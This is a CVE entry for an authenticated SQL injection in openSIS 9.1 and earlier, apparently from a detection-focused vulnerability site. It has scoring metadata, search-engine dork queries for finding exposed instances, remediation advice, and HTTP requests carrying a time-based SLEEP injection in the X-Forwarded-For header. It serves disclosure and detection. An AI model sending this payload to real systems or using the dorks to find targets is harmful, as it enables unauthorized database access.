---
layout: post
cve_id: CVE-2024-35584
title: openSIS < 9.1 - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-35584.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-35584.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: high
impact: 'Authenticated attackers can perform SQL injection via the X-Forwarded-For
  header, potentially extracting or modifying sensitive database information.

  '
remediation: 'Update openSIS to a version later than 9.1 that patches the SQL injection
  vulnerability.

  '
reference:
- https://www.tenable.com/cve/CVE-2024-35584
- https://vuldb.com/?id.280406
- https://github.com/whwhwh96/CVE-2024-35584
- https://github.com/OS4ED/openSIS-Classic
- http://opensis.com
- https://nvd.nist.gov/vuln/detail/CVE-2024-35584
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2024-35584
  cwe-id: CWE-89
  epss-score: 0.82738
  epss-percentile: 0.99211
metadata:
  max-request: 2
  vendor: os4ed
  product: opensis
  shodan-query: http.title:"opensis"
  fofa-query: title="opensis"
  google-query: intitle:"opensis"
tags:
- cve
- cve2024
- opensis
- authenticated
- sqli
- vuln
---

## ðŸ” Vulnerability Description
SQL injection vulnerability in Ajax.php, ForWindow.php, ForExport.php, Modules.php, functions/HackingLogFnc.php in OpenSis Community Edition 9.1, 8.0, and possibly earlier versions. It is possible for an authenticated user to perform SQL Injection due to the lack to sanitisation. The application takes arbitrary value from "X-Forwarded-For" header and appends it to a SQL INSERT statement directly, leading to SQL Injection.


## ðŸŒ HTTP Request
```nohighlight
POST /index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Safari/537.36
Connection: close
Content-Length: 48
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
USERNAME=5V5G6l&PASSWORD=06oa17&language=en&log=
```

```nohighlight
GET /Ajax.php?modname=tools/notallowed.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
X-Forwarded-For: 122.122.122.122' AND SLEEP(7) AND '1'='1
Accept-Encoding: gzip
```

